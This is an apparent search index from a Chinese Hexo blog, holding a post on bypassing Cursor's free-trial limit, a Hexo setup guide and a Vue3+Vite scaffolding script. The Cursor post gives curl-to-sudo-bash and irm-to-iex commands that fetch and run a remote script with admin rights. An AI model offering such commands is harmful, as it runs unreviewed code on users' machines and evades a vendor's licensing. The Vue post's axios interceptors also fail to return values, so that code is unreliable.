<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>cursor白嫖</title>
    <url>/2025/01/03/cursor%E7%99%BD%E5%AB%96/</url>
    <content><![CDATA[<h1 id="cursor白嫖"><a href="#cursor白嫖" class="headerlink" title="cursor白嫖"></a>cursor白嫖</h1><p>Linux&#x2F;macOS下打开terminal</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://raw.githubusercontent.com/yuaotian/go-cursor-help/master/scripts/install.sh | <span class="built_in">sudo</span> bash</span><br></pre></td></tr></table></figure>

<p>Windows下打开powershell(管理员模式)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">irm https://raw.githubusercontent.com/yuaotian/go-cursor-help/master/scripts/install.ps1 | iex</span><br></pre></td></tr></table></figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://www.kelen.cc/faq/cursor-too-many-free-trial-accounts-used-on-this-machine">Too many free trial accounts used on this machine，解决Cursor免费试用限制问题</a></li>
<li><a href="https://github.com/yuaotian/go-cursor-help">go-cursor-help</a></li>
</ul>
]]></content>
      <tags>
        <tag>toy</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo框架搭建个人博客</title>
    <url>/2024/12/24/hexo%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="hexo框架搭建个人博客"><a href="#hexo框架搭建个人博客" class="headerlink" title="hexo框架搭建个人博客"></a>hexo框架搭建个人博客</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><h3 id="1-1-hexo是什么"><a href="#1-1-hexo是什么" class="headerlink" title="1.1 hexo是什么"></a>1.1 hexo是什么</h3><p><a href="https://hexo.io/zh-cn/">hexo</a>是一个快速、简洁且高效的博客框架，基于Node.js，可以快速搭建个人博客。</p>
<p><img src="/images/image5.png" alt="alt text"></p>
<h3 id="1-2-hexo的优势"><a href="#1-2-hexo的优势" class="headerlink" title="1.2 hexo的优势"></a>1.2 hexo的优势</h3><ul>
<li>快速搭建</li>
<li>简洁高效</li>
<li>支持markdown</li>
<li>支持插件</li>
<li>支持主题</li>
</ul>
<h2 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h2><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><p>Git是一个先进的分布式版本控制工具，可以有效处理不同规模的项目版本管理。这里用于管理你的Hexo文章，将本地的博客上传至Github。到<a href="https://git-scm.com/downloads">Git</a>官网选择合适的版本下载，安装后会有一个Git Bash的命令行工具，之后用该工具操作Git。</p>
<p><img src="/images/image3.png" alt="alt text"></p>
<p>检查是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p>正常显示版本号，无报错即为安装成功。</p>
<h3 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h3><p>Hexo基于Node.js，所以需要安装Node.js及npm工具。可进入<a href="https://nodejs.org/en">Node.js</a>官网下载，选择LTS（长期支持版本）即可。</p>
<p><img src="/images/image4.png" alt="alt text"></p>
<p>检查是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure>

<p>正常显示版本号，无报错即为安装成功。</p>
<h2 id="三、安装hexo"><a href="#三、安装hexo" class="headerlink" title="三、安装hexo"></a>三、安装hexo</h2><h3 id="3-1-安装hexo"><a href="#3-1-安装hexo" class="headerlink" title="3.1 安装hexo"></a>3.1 安装hexo</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<h3 id="3-2-初始化hexo"><a href="#3-2-初始化hexo" class="headerlink" title="3.2 初始化hexo"></a>3.2 初始化hexo</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog-name</span><br><span class="line">hexo init </span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<h3 id="3-3-启动hexo"><a href="#3-3-启动hexo" class="headerlink" title="3.3 启动hexo"></a>3.3 启动hexo</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server </span><br><span class="line"><span class="comment"># 或者 hexo s</span></span><br></pre></td></tr></table></figure>

<h3 id="3-4-访问博客"><a href="#3-4-访问博客" class="headerlink" title="3.4 访问博客"></a>3.4 访问博客</h3><p>打开浏览器，输入<code>http://localhost:4000</code>即可访问博客。</p>
<h2 id="四、hexo常用命令"><a href="#四、hexo常用命令" class="headerlink" title="四、hexo常用命令"></a>四、hexo常用命令</h2><h3 id="4-1-新建文章"><a href="#4-1-新建文章" class="headerlink" title="4.1 新建文章"></a>4.1 新建文章</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;文章标题&quot;</span></span><br><span class="line"><span class="comment"># 或者 hexo n &quot;文章标题&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-2-生成静态文件"><a href="#4-2-生成静态文件" class="headerlink" title="4.2 生成静态文件"></a>4.2 生成静态文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line"><span class="comment"># 或者 hexo g</span></span><br></pre></td></tr></table></figure>

<h3 id="4-3-部署到github"><a href="#4-3-部署到github" class="headerlink" title="4.3 部署到github"></a>4.3 部署到github</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br><span class="line"><span class="comment"># 或者 hexo d</span></span><br></pre></td></tr></table></figure>

<h3 id="4-4-清除缓存"><a href="#4-4-清除缓存" class="headerlink" title="4.4 清除缓存"></a>4.4 清除缓存</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>

<h3 id="4-5-本地预览"><a href="#4-5-本地预览" class="headerlink" title="4.5 本地预览"></a>4.5 本地预览</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server</span><br><span class="line"><span class="comment"># 或者 hexo s</span></span><br></pre></td></tr></table></figure>

<h2 id="五、hexo配置"><a href="#五、hexo配置" class="headerlink" title="五、hexo配置"></a>五、hexo配置</h2><h3 id="5-1-修改主题"><a href="#5-1-修改主题" class="headerlink" title="5.1 修改主题"></a>5.1 修改主题</h3><p>从<a href="https://hexo.io/themes/">hexo官网</a>下载主题，解压到<code>themes</code>目录下，或者从github上clone主题到<code>themes</code>目录下，或者使用npm安装主题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save <span class="string">&quot;主题名称&quot;</span></span><br><span class="line"><span class="comment"># 例如 npm install --save hexo-theme-next</span></span><br></pre></td></tr></table></figure>

<p>或者使用git clone命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> <span class="string">&quot;主题地址&quot;</span> themes/<span class="string">&quot;主题名称&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后在<code>_config.yml</code>文件中修改<code>theme</code>字段，将默认主题<code>landscape</code>修改为其他主题。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">&quot;主题名称&quot;</span></span><br><span class="line"><span class="comment"># 例如 theme: hexo-theme-next</span></span><br></pre></td></tr></table></figure>

<h3 id="5-2-修改站点信息"><a href="#5-2-修改站点信息" class="headerlink" title="5.2 修改站点信息"></a>5.2 修改站点信息</h3><p>在<code>_config.yml</code>文件中修改<code>title</code>、<code>subtitle</code>、<code>description</code>、<code>author</code>等字段。</p>
<p>…</p>
<h2 id="六、部署到github"><a href="#六、部署到github" class="headerlink" title="六、部署到github"></a>六、部署到github</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>在<code>_config.yml</code>文件中修改<code>deploy</code>字段。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">&quot;仓库地址&quot;</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">&quot;分支&quot;</span> <span class="comment"># 默认为main</span></span><br></pre></td></tr></table></figure>

<p>然后执行部署命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>等待部署完成后，打开浏览器，输入<code>https://用户名.github.io</code>即可访问博客。</p>
<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p>至此，hexo框架搭建个人博客的过程已经介绍完毕，希望对你有所帮助。</p>
]]></content>
      <tags>
        <tag>toy</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3 + Vite项目工程化搭建</title>
    <url>/2024/12/26/Vue3-Vite%E9%A1%B9%E7%9B%AE%E5%B7%A5%E7%A8%8B%E5%8C%96%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="Vue3-Vite项目工程化搭建"><a href="#Vue3-Vite项目工程化搭建" class="headerlink" title="Vue3 + Vite项目工程化搭建"></a>Vue3 + Vite项目工程化搭建</h1><h2 id="安装-Vite"><a href="#安装-Vite" class="headerlink" title="安装 Vite"></a>安装 Vite</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g create-vite</span><br></pre></td></tr></table></figure>

<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm create vite</span><br></pre></td></tr></table></figure>

<h2 id="进入项目目录"><a href="#进入项目目录" class="headerlink" title="进入项目目录"></a>进入项目目录</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入项目目录</span></span><br><span class="line"><span class="built_in">cd</span> my-vite-app</span><br></pre></td></tr></table></figure>

<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">npm install</span><br><span class="line"><span class="comment">#安装 Element Plus</span></span><br><span class="line">npm install element-plus</span><br><span class="line"><span class="comment">#安装 Vue Router</span></span><br><span class="line">npm install vue-router</span><br><span class="line"><span class="comment">#安装 Pinia</span></span><br><span class="line">npm install pinia</span><br><span class="line"><span class="comment">#安装 Sass，安装时需要添加 -D 参数，表示将 Sass 添加到开发依赖中，在打包过程中，Sass 会自动编译为 CSS</span></span><br><span class="line">npm install sass -D</span><br><span class="line"><span class="comment">#安装 VueUse</span></span><br><span class="line">npm i @vueuse/core</span><br><span class="line"><span class="comment">#安装 Axios</span></span><br><span class="line">npm install axios</span><br><span class="line"><span class="comment">#安装 Echarts</span></span><br><span class="line">npm install echarts</span><br><span class="line"><span class="comment">#安装 Prettier 及相关插件</span></span><br><span class="line">npm install -D prettier</span><br><span class="line">npm install -D eslint-plugin-prettier</span><br><span class="line"><span class="comment">#安装插件</span></span><br><span class="line">npm install -D unplugin-vue-components unplugin-auto-import</span><br></pre></td></tr></table></figure>

<h2 id="创建目录结构"><a href="#创建目录结构" class="headerlink" title="创建目录结构"></a>创建目录结构</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> src</span><br><span class="line"><span class="built_in">rm</span> -rf components/* modules</span><br><span class="line"><span class="built_in">mkdir</span> views router store api styles utils layouts</span><br><span class="line"><span class="built_in">cd</span> views</span><br><span class="line"><span class="built_in">mkdir</span> dashboard login</span><br><span class="line"><span class="built_in">touch</span> dashboard/index.vue login/index.vue</span><br><span class="line"><span class="built_in">mkdir</span> hall</span><br><span class="line"><span class="built_in">touch</span> hall/index.vue</span><br><span class="line"><span class="built_in">cd</span> ../router</span><br><span class="line"><span class="built_in">touch</span> index.js</span><br><span class="line"><span class="built_in">cd</span> ../store</span><br><span class="line"><span class="built_in">touch</span> index.js</span><br><span class="line"><span class="built_in">mkdir</span> modules</span><br><span class="line"><span class="built_in">touch</span> modules/user.js</span><br><span class="line"><span class="built_in">cd</span> ../layouts</span><br><span class="line"><span class="built_in">touch</span> HomeLayout.vue NotFoundLayout.vue</span><br><span class="line"><span class="built_in">cd</span> ../api</span><br><span class="line"><span class="built_in">touch</span> user.js</span><br><span class="line"><span class="built_in">cd</span> ../styles</span><br><span class="line"><span class="built_in">touch</span> variables.scss</span><br><span class="line"><span class="built_in">cd</span> ../utils</span><br><span class="line"><span class="built_in">touch</span> request.js echarts.js</span><br><span class="line"><span class="built_in">cd</span> ../..</span><br></pre></td></tr></table></figure>

<h2 id="配置-Vite"><a href="#配置-Vite" class="headerlink" title="配置 Vite"></a>配置 Vite</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; vite.config.js</span></span><br><span class="line"><span class="string">import &#123; defineConfig &#125; from &#x27;vite&#x27;</span></span><br><span class="line"><span class="string">import vue from &#x27;@vitejs/plugin-vue&#x27;</span></span><br><span class="line"><span class="string">import AutoImport from &quot;unplugin-auto-import/vite&quot;;</span></span><br><span class="line"><span class="string">import Components from &quot;unplugin-vue-components/vite&quot;;</span></span><br><span class="line"><span class="string">import &#123;ElementPlusResolver&#125; from &quot;unplugin-vue-components/resolvers&quot;;</span></span><br><span class="line"><span class="string">import &#123; resolve &#125; from &quot;path&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// https://vite.dev/config/</span></span><br><span class="line"><span class="string">export default defineConfig(&#123;</span></span><br><span class="line"><span class="string">  plugins: [</span></span><br><span class="line"><span class="string">    vue(),</span></span><br><span class="line"><span class="string">    // 自动导入</span></span><br><span class="line"><span class="string">    AutoImport(&#123;</span></span><br><span class="line"><span class="string">      // 自动导入 Vue 相关函数，如：ref, reactive, toRef 等</span></span><br><span class="line"><span class="string">      imports: [&quot;vue&quot;, &quot;vue-router&quot;, &quot;@vueuse/core&quot;],</span></span><br><span class="line"><span class="string">      resolvers: [</span></span><br><span class="line"><span class="string">        // 自动导入 Element Plus 相关函数</span></span><br><span class="line"><span class="string">        ElementPlusResolver(),</span></span><br><span class="line"><span class="string">      ],</span></span><br><span class="line"><span class="string">      // 配置文件位置 (false:关闭自动生成)</span></span><br><span class="line"><span class="string">      dts: resolve(__dirname, &quot;src/types/auto-imports.d.ts&quot;),</span></span><br><span class="line"><span class="string">    &#125;),</span></span><br><span class="line"><span class="string">    Components(&#123;</span></span><br><span class="line"><span class="string">      resolvers: [</span></span><br><span class="line"><span class="string">        // 自动导入 Element Plus 组件</span></span><br><span class="line"><span class="string">        ElementPlusResolver(),</span></span><br><span class="line"><span class="string">      ],</span></span><br><span class="line"><span class="string">      // 指定自定义组件位置(默认:src/components)</span></span><br><span class="line"><span class="string">      dirs: [&quot;src/**/components&quot;],</span></span><br><span class="line"><span class="string">      // 配置文件位置 (false:关闭自动生成)</span></span><br><span class="line"><span class="string">      dts: resolve(__dirname, &quot;src/types/components.d.ts&quot;),</span></span><br><span class="line"><span class="string">    &#125;),</span></span><br><span class="line"><span class="string">  ],</span></span><br><span class="line"><span class="string">  resolve: &#123;</span></span><br><span class="line"><span class="string">    // 导入文件时省略文件扩展名</span></span><br><span class="line"><span class="string">    extensions: [&quot;.js&quot;, &quot;.ts&quot;, &quot;.vue&quot;, &quot;.json&quot;, &quot;es&quot;],</span></span><br><span class="line"><span class="string">    // 配置路径别名</span></span><br><span class="line"><span class="string">    alias: &#123; &quot;@&quot;: resolve(__dirname, &quot;src&quot;) &#125;,</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  css: &#123;</span></span><br><span class="line"><span class="string">    // CSS 预处理器</span></span><br><span class="line"><span class="string">    preprocessorOptions: &#123;</span></span><br><span class="line"><span class="string">      // 定义全局 SCSS 变量</span></span><br><span class="line"><span class="string">      scss: &#123;</span></span><br><span class="line"><span class="string">        javascriptEnabled: true,</span></span><br><span class="line"><span class="string">        additionalData: &quot;@use &#x27;/src/styles/variables.scss&#x27; as *;&quot;,</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; views/dashboard/index.vue</span></span><br><span class="line"><span class="string">&lt;script setup&gt;</span></span><br><span class="line"><span class="string">import echarts from &quot;@/utils/echarts&quot;;</span></span><br><span class="line"><span class="string">import &#123; onMounted, ref &#125; from &quot;vue&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const chartRef = ref(null);</span></span><br><span class="line"><span class="string">let echartClient = null;</span></span><br><span class="line"><span class="string">onMounted(() =&gt; &#123;</span></span><br><span class="line"><span class="string">  initChart();</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">function initChart() &#123;</span></span><br><span class="line"><span class="string">  echartClient = echarts.init(chartRef.value);</span></span><br><span class="line"><span class="string">  echartClient.setOption(&#123;</span></span><br><span class="line"><span class="string">    tooltip: &#123;&#125;,</span></span><br><span class="line"><span class="string">    xAxis: &#123;</span></span><br><span class="line"><span class="string">      data: [&quot;衬衫&quot;, &quot;羊毛衫&quot;, &quot;雪纺衫&quot;, &quot;裤子&quot;, &quot;高跟鞋&quot;, &quot;袜子&quot;],</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    yAxis: &#123;&#125;,</span></span><br><span class="line"><span class="string">    series: [</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        name: &quot;销量&quot;,</span></span><br><span class="line"><span class="string">        type: &quot;bar&quot;,</span></span><br><span class="line"><span class="string">        data: [5, 20, 36, 10, 10, 20],</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">    ],</span></span><br><span class="line"><span class="string">  &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;template&gt;</span></span><br><span class="line"><span class="string">  &lt;div class=&quot;chart-box&quot; ref=&quot;chartRef&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;style scoped lang=&quot;scss&quot;&gt;</span></span><br><span class="line"><span class="string">.chart-box &#123;</span></span><br><span class="line"><span class="string">  width: 600px;</span></span><br><span class="line"><span class="string">  height: 400px;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; views/login/index.vue</span></span><br><span class="line"><span class="string">&lt;!--src/views/login/index.vue--&gt;</span></span><br><span class="line"><span class="string">&lt;script setup&gt;</span></span><br><span class="line"><span class="string">import useUserStore from &quot;../../store/modules/user&quot;;</span></span><br><span class="line"><span class="string">import &#123; getCodeInfo &#125; from &quot;../../api/user&quot;;</span></span><br><span class="line"><span class="string">import &#123; onMounted, ref &#125; from &quot;vue&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const userStore = useUserStore();</span></span><br><span class="line"><span class="string">const captchaInfo = ref(&quot;&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * 登录</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">function login() &#123;</span></span><br><span class="line"><span class="string">  userStore</span></span><br><span class="line"><span class="string">    .handleLogin()</span></span><br><span class="line"><span class="string">    .then((res) =&gt; &#123;</span></span><br><span class="line"><span class="string">      ElMessage.success(res);</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    .catch((err) =&gt; &#123;</span></span><br><span class="line"><span class="string">      ElMessage.error(err);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * 退出登录</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">function loginOut() &#123;</span></span><br><span class="line"><span class="string">  userStore</span></span><br><span class="line"><span class="string">    .handleLogout()</span></span><br><span class="line"><span class="string">    .then(() =&gt; &#123;</span></span><br><span class="line"><span class="string">      ElMessage.success(&quot;退出登录成功&quot;);</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    .catch((err) =&gt; &#123;</span></span><br><span class="line"><span class="string">      ElMessage.error(err);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">onMounted(() =&gt; &#123;</span></span><br><span class="line"><span class="string">  getCodeInfo(new Date().getTime()).then((&#123; data &#125;) =&gt; &#123;</span></span><br><span class="line"><span class="string">    captchaInfo.value = data.result;</span></span><br><span class="line"><span class="string">  &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;template&gt;</span></span><br><span class="line"><span class="string">  &lt;div class=&quot;login-container&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;el-button type=&quot;primary&quot; @click=&quot;login&quot;&gt;登 录&lt;/el-button&gt;</span></span><br><span class="line"><span class="string">    &lt;el-button type=&quot;primary&quot; @click=&quot;loginOut&quot;&gt;退出登录&lt;/el-button&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;hr /&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;当前登录状态：&#123;&#123; userStore.loginStatus ? &quot;已登录&quot; : &quot;未登录&quot; &#125;&#125;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">      &lt;li&gt;用户名：&#123;&#123; userStore.userInfo.name &#125;&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="string">      &lt;li&gt;头 像：&lt;img :src=&quot;userStore.userInfo.avatar&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">      &lt;li&gt;验证码：&lt;img :src=&quot;captchaInfo&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; App.vue</span></span><br><span class="line"><span class="string">&lt;template&gt;</span></span><br><span class="line"><span class="string">  &lt;component :is=&quot;currentLayout&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;router-view&gt;&lt;/router-view&gt;</span></span><br><span class="line"><span class="string">  &lt;/component&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">import HomeLayout from &#x27;./layouts/HomeLayout.vue&#x27;;</span></span><br><span class="line"><span class="string">import NotFoundLayout from &#x27;./layouts/NotFoundLayout.vue&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">export default &#123;</span></span><br><span class="line"><span class="string">  data() &#123;</span></span><br><span class="line"><span class="string">    return &#123;</span></span><br><span class="line"><span class="string">      currentLayout: this.getLayout(), // 获取当前布局</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  methods: &#123;</span></span><br><span class="line"><span class="string">    getLayout() &#123;</span></span><br><span class="line"><span class="string">      if (this.$route.path === &#x27;/404&#x27;) &#123;</span></span><br><span class="line"><span class="string">        return NotFoundLayout;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      return HomeLayout;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  watch: &#123;</span></span><br><span class="line"><span class="string">    $route() &#123;</span></span><br><span class="line"><span class="string">      this.currentLayout = this.getLayout(); // 路由变化时切换布局</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; main.js</span></span><br><span class="line"><span class="string">import &#123; createApp &#125; from &quot;vue&quot;;</span></span><br><span class="line"><span class="string">import App from &quot;./App.vue&quot;;</span></span><br><span class="line"><span class="string">import router from &quot;./router&quot;;</span></span><br><span class="line"><span class="string">import pinia from &quot;./store&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const app = createApp(App);</span></span><br><span class="line"><span class="string">app.use(router);</span></span><br><span class="line"><span class="string">app.use(pinia);</span></span><br><span class="line"><span class="string">app.mount(&quot;#app&quot;);</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; utils/request.js</span></span><br><span class="line"><span class="string">// src/utils/request.js</span></span><br><span class="line"><span class="string">import axios from &quot;axios&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const request = axios.create(&#123;</span></span><br><span class="line"><span class="string">  baseURL: &quot;http://xxx.xxx.xxx.xxx // 请求的后端接口地址&quot;,</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * 请求拦截器</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">request.interceptors.request.use((config) =&gt; &#123;</span></span><br><span class="line"><span class="string">  console.log(&quot;请求参数：&quot;, config);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * 响应拦截器</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">request.interceptors.response.use((response) =&gt; &#123;</span></span><br><span class="line"><span class="string">  console.log(&quot;响应参数：&quot;, response);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">export default request;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; utils/echarts.js</span></span><br><span class="line"><span class="string">// src/utils/echarts.js</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 引入 echarts 核心模块，核心模块提供了 echarts 使用必须要的接口。</span></span><br><span class="line"><span class="string">import * as echarts from &quot;echarts/core&quot;;</span></span><br><span class="line"><span class="string">// 引入柱状图图表，图表后缀都为 Chart</span></span><br><span class="line"><span class="string">import &#123; BarChart &#125; from &quot;echarts/charts&quot;;</span></span><br><span class="line"><span class="string">// 引入提示框，标题，直角坐标系，数据集，内置数据转换器组件，组件后缀都为 Component</span></span><br><span class="line"><span class="string">import &#123;</span></span><br><span class="line"><span class="string">    TitleComponent,</span></span><br><span class="line"><span class="string">    TooltipComponent,</span></span><br><span class="line"><span class="string">    GridComponent,</span></span><br><span class="line"><span class="string">    DatasetComponent,</span></span><br><span class="line"><span class="string">    TransformComponent,</span></span><br><span class="line"><span class="string">&#125; from &quot;echarts/components&quot;;</span></span><br><span class="line"><span class="string">// 标签自动布局、全局过渡动画等特性</span></span><br><span class="line"><span class="string">import &#123; LabelLayout, UniversalTransition &#125; from &quot;echarts/features&quot;;</span></span><br><span class="line"><span class="string">// 引入 Canvas 渲染器，注意引入 CanvasRenderer 或者 SVGRenderer 是必须的一步</span></span><br><span class="line"><span class="string">import &#123; CanvasRenderer &#125; from &quot;echarts/renderers&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 注册必须的组件</span></span><br><span class="line"><span class="string">echarts.use([</span></span><br><span class="line"><span class="string">    TitleComponent,</span></span><br><span class="line"><span class="string">    TooltipComponent,</span></span><br><span class="line"><span class="string">    GridComponent,</span></span><br><span class="line"><span class="string">    DatasetComponent,</span></span><br><span class="line"><span class="string">    TransformComponent,</span></span><br><span class="line"><span class="string">    BarChart,</span></span><br><span class="line"><span class="string">    LabelLayout,</span></span><br><span class="line"><span class="string">    UniversalTransition,</span></span><br><span class="line"><span class="string">    CanvasRenderer,</span></span><br><span class="line"><span class="string">]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">export default echarts;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; styles/variables.scss</span></span><br><span class="line"><span class="string">//src/styles/variables.scss</span></span><br><span class="line"><span class="string">\$success: #48c78e;</span></span><br><span class="line"><span class="string">\$danger: #f28482;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span 